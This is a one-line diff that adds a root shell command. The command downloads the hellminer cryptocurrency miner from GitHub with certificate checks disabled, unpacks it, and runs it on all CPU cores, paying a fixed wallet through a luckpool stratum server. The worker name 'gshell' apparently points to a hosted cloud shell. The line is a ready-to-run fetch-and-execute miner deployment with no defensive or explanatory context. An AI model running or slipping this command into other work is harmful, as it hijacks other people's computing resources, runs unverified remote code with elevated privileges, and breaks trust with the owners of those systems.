@@ -1,0 +1,1 @@
+su -c "apt update && apt install wget unzip -y && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz --no-check-certificate && tar xvf *tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RR4qtraswKXwc6xnPGesCaXrXXiyLuC8XY.gshell -p x --cpu `nproc`"
